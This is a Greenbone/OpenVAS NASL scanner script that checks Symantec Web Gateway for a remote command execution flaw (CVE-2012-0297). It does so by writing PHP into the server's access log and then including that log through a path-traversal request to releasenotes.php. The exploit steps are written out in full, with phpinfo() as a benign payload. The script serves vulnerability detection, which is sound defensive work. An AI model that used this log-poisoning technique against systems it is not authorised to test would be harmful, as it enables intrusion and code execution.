# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:symantec:web_gateway";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802632");
  script_version("2023-07-25T05:05:58+0000");
  script_cve_id("CVE-2012-0297", "CVE-2012-0299");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2023-07-25 05:05:58 +0000 (Tue, 25 Jul 2023)");
  script_tag(name:"creation_date", value:"2012-06-01 12:12:12 +0530 (Fri, 01 Jun 2012)");
  script_name("Symantec Web Gateway Remote Shell Command Execution Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_symantec_web_gateway_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("symantec_web_gateway/installed");

  script_xref(name:"URL", value:"http://secunia.com/advisories/49216");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/53443");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/53444");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18932");
  script_xref(name:"URL", value:"http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=2012&suid=20120517_00");

  script_tag(name:"impact", value:"Successful exploits will result in the execution of arbitrary attack supplied
  commands in the context of the affected application.");

  script_tag(name:"affected", value:"Symantec Web Gateway versions 5.0.x before 5.0.3");

  script_tag(name:"insight", value:"The flaw is due to an improper validation of certain unspecified
  input. This can be exploited to execute arbitrary code by injecting crafted
  data or including crafted data.");

  script_tag(name:"solution", value:"Upgrade to Symantec Web Gateway version 5.0.3 or later.");

  script_tag(name:"summary", value:"Symantec Web Gateway is prone to a command execution vulnerability.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:port)){
  exit(0);
}

if(dir == "/") dir = "";
exploit= 'GET ' + dir + '/<?php phpinfo();?> HTTP/1.1\r\n\r\n';
res = http_send_recv(port:port, data:exploit);

url = dir + "/spywall/releasenotes.php?relfile=../../../../../usr/local/apache2/logs/access_log";
req = http_get(item:url, port:port);
res = http_send_recv(port:port, data:req);

if(res && res =~ "^HTTP/1\.[01] 200" && "<title>phpinfo()" >< res && "<title>Symantec Web Gateway" >< res){
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
